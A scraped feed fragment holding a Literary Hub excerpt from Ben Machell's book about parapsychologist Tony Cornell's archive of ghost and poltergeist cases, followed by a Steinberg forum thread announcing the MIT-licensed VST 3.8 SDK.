    &lt;p&gt;It is a drizzly afternoon in the spring of 2023, and Iâm in the Special Collections room of the Cambridge University Library, waiting at the front desk a little nervously. It is my first time here and, hidden away on the top floor of the vast building, there is a peculiar sense of having entered a place where time does not quite pass as it should. I glance around. A man sitting at one of the heavy wooden tables is wearing a pair of latex gloves, and carefully turns the pages of a manuscript that could be five, six, seven hundred years old. Two students have unrolled what looks like an incomplete treasure map, and lean over it with magnifying glasses, murmuring to one another. An elderly woman sits beside a small pile of old leather-bound books and rubs her eyes wearily.&lt;/p&gt;
    &lt;p&gt;All of these items are uniqueâmementos of lives and events long pastâand are kept in the library archive until somebody requests to see them. I look at the various papers being tenderly examined and wonder, prior to today, how long they had been sitting untouched, cataloged and filed away out of sight and mind. Years? Decades? Generations? These thoughts are interrupted by the soft voice of a librarian, who has arrived at the front desk with a trolley, on top of which are stacked several cardboard boxes. Some of them bear the words âCORNELL,â written in black marker pen. She hands me a slip to sign, and then I carefully lift the first box oï¬ the trolley, feeling oddly self-conscious. The librarian smiles. âThereâs an awful lot more in the archive,â she says, as I turn to find a table.&lt;/p&gt;
    &lt;p&gt;I take a seat and look inside the box. I donât know what I am expecting to find or where I should begin. I pull out, at random, a typed report of some two dozen pages titled âIs Emotion the Psychic Trigger?â I place it on the table beside me and reach into the box again. This time, I produce a faded foolscap folder with âTelepathy, Apparitions and Precognitionâ written on it. I keep going. There are several spiral-bound shorthand notepads.&lt;/p&gt;
    &lt;p&gt;One has the words âSpontaneous Casesâ written on the cover in ballpoint ink, accompanied by time stamps. Sheerness, 1987. Southampton, 1990. Thetford, 1991. I begin to skim the contents, doing my best to read the quick, slanting handwriting inside. Several pages describe a visit to the home of a trawlerman who is repeatedly attacked by a hideous black dog only he can see. This beast, nonetheless, has left many bloody lacerations on the manâs bodyâincluding âfive deep cuts on the underside of upper left leg,â according to the notesâand the intervention of a local vicar has had no apparent eï¬ect.&lt;/p&gt;
    &lt;p&gt;I keep reading. Hours slide past without my noticing. I only move in order to return to the front desk for another box. There are newspaper clippings, from the 1950s through to the 2000s, concerning ghost sightings, or reports of poltergeists in market towns or children who appear to possess uncanny extrasensory powers. There is a rotting photo album containing pages and pages of eerie, Edwardian-era âspirit photographsâ: disembodied faces floating in faded sepia. There are strange cards marked with odd monochrome symbols.&lt;/p&gt;
    &lt;p&gt;In one folder, I find a series of letters from the 1960s with Soviet stamps and postmarks, which have been sent from a professor at Leningrad University. These letters talk excitedly of cooperation between Russian and British researchers into psychic phenomena, despite finding themselves on opposing sides of a Cold War. Another letter, dated February 1960, is from the Swiss psychoanalyst Carl Jung, who writes of his lifelong interest in the paranormal, and who provides dozens of densely worded paragraphs on the subject. âIn the case of telepathy, we might be able to establish a causal explanation,â writes Jung. âBut in the case of precognition, such a chance does not exist.â&lt;/p&gt;
    &lt;p&gt;Most of the letters in these boxes, however, do not come from Soviet psychic researchers, or famous thinkers like Jung. Rather, I find they have been written by ordinary people. One letter, brisk and to the point, is from the neighbor of a family in Lancashire, who find that for reasons that cannot be explained, their home is regularly left sodden by water which seems to materialize from nowhere. âEvery night for the past three weeks, usually between the hours of 4 p.m. and midnight, considerable quantities of water pour from out of the air in every room of the house,â the neighbor writes. âThe local water board have been and ruled out the possibility of a mains leak, and the âexpertsâ have been and cannot oï¬er any help or even an explanation . . . If you cannot come and see this, please write any suggestions. You must know how these things are tackled.â&lt;/p&gt;
    &lt;p&gt;What do you do when you are caught up in events that cannot be explained?&lt;/p&gt;
    &lt;p&gt;I keep sifting. I read a handwritten note in which a man describes how his honeymoon in an old country inn was repeatedly interrupted by the appearance of a spectral figure, which both he and his wife saw. âAbout 5:30 a.m. I awoke suddenly and saw a pretty young girl around 13 to 15 years of age standing near the settee in our room,â he writes. âShe had blonde hair and looked as if she were in a nightdress. Her face was pale and she had some sort of garland around her head. She was not transparent but solid, and had a look of sadness on her face.â&lt;/p&gt;
    &lt;p&gt;In another letter, dating from 1963, a man complains that he is visited nightly by the ghost of a woman who subjects him to âinterference, such as fondlings and pressure against my body,â which has deprived him of sleep for weeks. âMy impression, Sir, is that this is some woman who has probably liked men and decided to have a go at me, even though she is no longer living in the flesh.â&lt;/p&gt;
    &lt;p&gt;What do you do when you are caught up in events that cannot be explained? When your understanding of reality is challenged in such profound and disturbing ways that the sureties of science, religion or simple common sense provide neither comfort nor closure? For decades, thousands of ordinary people who found themselves in these circumstances called upon the help of a balding, bespectacled man from Cambridge. His name was Tony Cornell, and between the 1950s and his death in 2010, he was one of the most prolific parapsychologistsâwhich is to say, one who investigates psychic phenomena and other paranormal claimsâ on the planet. The contents of these cardboard boxes, stored deep within the Special Collections archive, once belonged to him.&lt;/p&gt;
    &lt;p&gt;And underpinning everythingâthe papers, notes, cuttings, photographs, correspondences and transcriptsâis one question, asked again and again and again. What happens when we die? When our bodies fail and our hearts stop and the lights go out, is that it? Are we all faced with an eternity of nothingness, of blank, perennial non-existence? Or is there more to humankind than our physical bodies? Do we possess a soul, spirit or sense of consciousness that can transcend physical mortality? The contents of these boxes are the memories of a man who spent his life probing the very edges of reality. Testing the barrier between life and death.&lt;/p&gt;
    &lt;p&gt;I had first encountered the name Tony Cornellâand found myself drawn into the world of psychical researchâsome six months earlier. It began with a visit to my grandmotherâs house. She was illâshe was dyingâand, because she was a practical-minded woman, she began pointing out the items around her house I could have when she was gone. Among these was a leather-bound box, inside of which was a crystal ball.&lt;/p&gt;
    &lt;p&gt;I had known about the crystal ball since I was a young child and had always been fascinated by it. Sometimes, my grandmother would bring it out of the box and let me hold it, smooth, cold and heavy in my hand, and she would explain that it had belonged to an aunt who believed she possessed a supernatural gift of foresight. This aunt would look into the ball and see the face of some distant relative, and then announce that the family would be having an unexpected visitor, before dispatching someone to the butcherâs to buy the very best pork chops for the occasion. Everyone would sit at the dinner table expectantly, their pork chops in front of them, waiting for a knock at the door that would, inevitably, never come. It is possible, my grandmother conceded, that this particular aunt just really liked pork chops.&lt;/p&gt;
    &lt;p&gt;When I returned home, I thought a lot about the crystal ball that would very soon be mine. Perhaps to distract myself from the sadness I was feeling at my grandmotherâs failing health, and perhaps because death and what may lie after was on my mind, I began to read up on mediumsâpeople who claim the ability to do everything from predicting the future to communing with the spirits of the deadâand quickly fell down a rabbit hole of online research. It was during these long nights hunched over my laptop, reading about ectoplasm and disembodied voices, that I came across a reference to a man who had visited dozens of sÃ©ances and investigated other potentially supernatural events that were of the uninvited and unplanned variety.&lt;/p&gt;
    &lt;p&gt;Cornellâs role as an investigator of so-called âspontaneous casesâ saw him returning time and again to the unsettling spaces that exist just on the periphery of our ordered, tidy and rational lives, and which we all do our best to ignore: ghosts.&lt;/p&gt;
    &lt;p&gt;Cornell would arrive at the scene of these disturbances in a suit and tie, carrying a bag containing notepads, tape recorders, cameras and, on occasion, other, homemade instruments. Personable, matter-of-fact and meticulous, in both appearance and manner he could easily have passed for an insurance claims assessor or senior police detective rather than a ghost hunter, albeit a senior police detective who was also a skilled hypnotist and who would not balk at creating a makeshift Ouija board in order to attempt communion with the dead.&lt;/p&gt;
    &lt;p&gt;A member of the UKâs Society for Psychical Research (SPR), an institution founded in 1882, Cornellâs role as an investigator of so-called âspontaneous casesâ saw him returning time and again to the unsettling spaces that exist just on the periphery of our ordered, tidy and rational lives, and which we all do our best to ignore: ghosts. Spirits. Premonitions. Psychic powers. Glimpses of other worlds that throw into question everything we take for granted about life, death and material existence itself.&lt;/p&gt;
    &lt;p&gt;At one point, during the 1980s, Cornell was invited to spend a week investigating the historic cruise liner the RMS Queen Mary, which was permanently moored in Long Beach, California, and known for its many reported hauntings. Working with American colleaguesâincluding a group of six mediums who had all been flown in from Atlanta for the occasionâhe surveilled the huge vessel, looking for signs of the ghosts who had made the old Cunard liner their home: the âWoman in Whiteâ who could be seen dancing alone in the shadows of the first-class drawing room, the unquiet spirit of a shipâs chef who had been murdered on board as well as that of a young seaman who had been crushed to death in the bowels of the ship and whose cries could still be heard by staï¬ at night.&lt;/p&gt;
    &lt;p&gt;When a family living in a remote rural home reported that a malign power seemed to have taken over their house, Cornell was dispatched. He arrived to find a terrified mother, father and son in a bungalow where light fixtures would swing back and forth unaccountably then burst without warning, where small fires broke out suddenly but persistently, and where tight plumbing screws seemed to undo themselves, causing pipes to loosen and floods to occur. Houseplants would wither and die. Pets fared no better. âA hamster and several birds died within two days of being housed in the bungalow,â the notes on the case report. âFive puppies had died within two weeks of being brought there. All had expired in the morning with a yelp, as if they had been shot.â&lt;/p&gt;
    &lt;p&gt;On another occasion, he went to meet the Lancashire family who had reported that water continually appeared from no apparent source, soaking their possessions and, on some occasions, flying through the air. A plumber had already stripped the house bare and ruled out any possibility that the water was coming from their pipes or any other traceable source. Over the course of a weekend with the family, interviewing them and observing their lives, Cornell concluded that the thirteen-year-old daughter was somehow at the center of these events.&lt;/p&gt;
    &lt;p&gt;While she admitted that she sometimes felt jealous of the attention her parents lavished upon her younger brother, she denied that she had anything to do with the strange appearance of water, which often forced her and her family to sleep on camp beds in the living room. Cornell believed her.&lt;/p&gt;
    &lt;p&gt;She also admitted that, sometimes, she and a friend played with a Ouija board. Before he left, he carried out a psychokinesis (PK) test on the girl, and asked her to throw a pair of dice thirteen times and aim to get as high a score as possible. Then he asked her to throw a pair of dice thirteen times and aim for as low a score as possible. She was able to throw considerably higher scores when she was aiming toâthe results only have a seventy-five to one chance of happening naturally.&lt;/p&gt;
    &lt;p&gt;Week after week, month after month, year after year, Cornell and his SPR colleagues sought out these eventsâthese crises unfolding in ordinary homes in ordinary towns to ordinary peopleâand attempted to deduce what, exactly, was happening: a calm, steady, scrutinizing presence amid the chaos and fear. Because although he possessed a deep curiosity about the supernatural, he was also a natural skeptic.&lt;/p&gt;
    &lt;p&gt;When attending sÃ©ances, he produced precise sketches of seating positions, and on more than one occasion exposed a would-be medium as a fraud. He produced transcripts of the conversations he held with hypnotized subjects, and amassed crates of cassette tapes containing interviews and telephone conversations with the people he encountered.&lt;/p&gt;
    &lt;p&gt;Reading these questions is like hearing the steady voice of a rational man methodically tapping the wall between reality and something else.&lt;/p&gt;
    &lt;p&gt;Among his papers, I discover, are copies of the incredibly detailed questionnaires he would ask everybody involved in a case to complete, which allowed him to construct a psychological profile of each individual he encountered and as clear a picture as possible of the frightening or inexplicable events they reported:&lt;/p&gt;
    &lt;p&gt;âWhat is your religious background?â&lt;/p&gt;
    &lt;p&gt;âWhat kind of books or articles have you read about psychic phenomena or the occult?â&lt;/p&gt;
    &lt;p&gt;âHave there been instances where one or more people have seen an apparition or ghost? If yes, please describe what was seen.â&lt;/p&gt;
    &lt;p&gt;âWould you say that the apparition seems to be one that is conscious or aware of its surroundings, that it is an intelligent âentityâ?â&lt;/p&gt;
    &lt;p&gt;âAre you taking any medication or non-prescription drugs? If so, what are they?â&lt;/p&gt;
    &lt;p&gt;âWhat is known about the building and its previous owners? Is anything known of the location it stands on?â&lt;/p&gt;
    &lt;p&gt;âAre the events seen to occur more in one spot (or in more than one place) than in others? Where are these places?â&lt;/p&gt;
    &lt;p&gt;âIf you were to pretend this were all happening in a dream, what would you make of it?â&lt;/p&gt;
    &lt;p&gt;âHave you ever had a ârun of luckâ?â&lt;/p&gt;
    &lt;p&gt;âHave you ever had, while awake, the vivid sensation of seeing, hearing, âsensing,â or being touched by someone or something which you could not explain by normal means?â&lt;/p&gt;
    &lt;p&gt;And on. And on. And on. Reading these questions is like hearing the steady voice of a rational man methodically tapping the wall between reality and something else. As evening falls, I return the cardboard boxes to the front desk, leave the library and make my way back to Cambridge station, feeling both exhausted and exhilarated. For a while I come close to falling asleep on the train home, but my mind turns with thoughts of secret Cold War experiments into telepathy, of images of ghostly, garland-wearing girls and terrified trawler-men covered in bloody gashes. The complacent faces of phony mediums swirl in my head, along with unsettling spirit photographs and images of puppies that had died with a sudden yelp for no apparent reason.&lt;/p&gt;
    &lt;p&gt;Eventually, I fall asleep, lulled by the sound of the train and of a teenage girl rolling dice again and again and again.&lt;/p&gt;
    &lt;p&gt;__________________________________&lt;/p&gt;
    &lt;p&gt;Excerpted from Chasing the Dark: A 140-Year Investigation of Paranormal Activity. Copyright Â© 2025 Ben Machell. Published by Grand Central Publishing, a Hachette Book Group company. Reproduced by arrangement with the Publisher. All rights reserved.&lt;/p&gt;
    &lt;head rend="h4"&gt;Ben Machell&lt;/head&gt;
    &lt;p&gt;Ben Machell has worked for the Times in London since 2005, and is a principal feature writer, interviewer, and columnist for the award-winning Times Magazine. His debut book, The Unusual Suspect, was widely acclaimed and shortlisted for the Golden Dagger at the 2022 Crime Writersâ Association Awards.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://lithub.com/the-mild-mannered-englishman-who-was-the-worlds-most-prolific-ghost-hunter/"/><published>2025-10-23T04:23:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678549</id><title>VST3 audio plugin format is now MIT</title><updated>2025-10-23T06:15:42.662440+00:00</updated><content>&lt;doc fingerprint="3d5306430856f9dc"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;Yvan
1&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;VST 3.8 SDK Released&lt;/p&gt;
        &lt;p&gt;Dear VST Developers,&lt;/p&gt;
        &lt;p&gt;Steinberg Media Technologies today releases the VST SDK 3.8&lt;/p&gt;
        &lt;p&gt;Hereâs a brief overview of changes:&lt;/p&gt;
        &lt;head rend="h1"&gt;Version 3.8.0 (2025/10/20)&lt;/head&gt;
        &lt;p&gt;The SDK can be downloaded here:&lt;/p&gt;
        &lt;p&gt;Online documentation available under:&lt;lb/&gt; VST - VST 3 Developer Portal (steinbergmedia.github.io)&lt;/p&gt;
        &lt;p&gt;Main VST page: vstdev.org&lt;/p&gt;
        &lt;p&gt;Your Steinberg Team&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 6 Likes &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Congratulations! Great to see both MIDI 2.0 and the new MIT license together!&lt;/p&gt;
        &lt;p&gt;Pete&lt;lb/&gt; Microsoft&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Great news!&lt;/p&gt;
        &lt;p&gt;FYI the SSL cert for https://vstdev.org/ doesnât seem to be correct.&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;rhansen
5&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;I assume it is correct. The domain vstdev.org just forwards to VSTDev (on github.io) where the website resides. Is your browser complaining about that?&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Thank you for the release and thank you for changing the Licensing. That is a monumental change!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;itâs working now. not sure what was wrong earlier. thanks!&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;rewgs
8&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;Wow, this is huge!! Not just the MIT license, not just MIDI 2.0, but Wayland support as well?! This Linux nerd is very happy. Thank you all!!&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://forums.steinberg.net/t/vst-3-8-0-sdk-released/1011988"/><published>2025-10-23T05:48:02+00:00</published></entry></feed>